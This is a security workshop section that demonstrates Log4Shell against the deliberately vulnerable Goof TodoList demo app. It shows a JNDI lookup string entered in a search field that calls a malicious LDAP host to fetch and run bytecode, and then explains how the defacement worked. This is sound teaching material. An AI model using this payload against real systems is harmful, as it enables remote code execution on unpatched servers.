[!CAUTION]
This section demonstrates exploiting an RCE vulnerability in the TodoList application from the Goof repo. Ensure you understand the security implications and use a controlled, isolated environment to avoid any unintended security risks.

## Exploiting an RCE vulnerability in the TodoList application

The Goof repo TodoList application contains a variety of exploits designed to demonstrate the risks posed by open source vulnerabilities. We'll demonstrate the infamous Log4Shell vulnerability as an example of an extremenly prolific open source package with a critical CVE that was relatively easy to exploit and gives malicous actors a remote code execution (RCE) vector of attack.

### Open the website
This example is best exploited from your browser so open a tab and navigate to the `todolist` application's loadbalancer address with `/todolist` appended to it.  That hostname was stored in the `TODOLIST_LB` variable during a prior section so you can easily get a string for the URL by echoing it out like this:


```sh
echo http://$TODOLIST_LB/todolist
```
Example LB Address
```
http://a4b2da77928d242b38e4229083fc2669-2133201151.us-east-2.elb.amazonaws.com/todolist
```

When you Click on that URL in your Cloud9 IDE and select "Open", you should see the ToDoList welcome page

### Log into the app
Click "Sign in" and log into the form with the following pre-populated user account:

* User:
```bash
foo@bar.org
```
* Password:
```bash
foobar
```

### Trigger the exploit

In the search field enter the following string and submit the search.
```bash
${jndi:ldap://ldap.darkweb:80/#Vandalize}
```
![todolist-search](/images/todolist-search-jndi.png)

### Vandalized!
Immediately, you can see that the header for the entire site has been changed to display a hacker's equivalent of graffiti!

## What?  Why?
A full rundown of the Log4Shell issue is out of scope for this workshop but the high level description is:

* This application is pulling in an older version of the log4j open source library
* The log4j code (at that version) blindly interpolates the JNDI addresses and queries the network for remote values
* Search queries are being logged by the application using log4j
* When the interpolated `${jndi:ldap://ldap.darkweb:80/#Vandalize}` string was encountered, log4j queried an LDAP server named `ldap.darkweb` to ask for something named "/#Vandalize"
* 'ldap.darkweb' is a malicous LDAP impersonator that recognized this request and interacted with log4j code in a way that caused malicuous Java bytecode to be returned and run in the JVM by log4j
* That bytecode modified the header.jsp file in this webapp

The returned bytecode could have done far more mallicous things, not the least of which would be to open a remote, reverse shell into the container.

## Catching and stoping this
In the next step we will look into ways to catch and fix vulnerabilities like this.
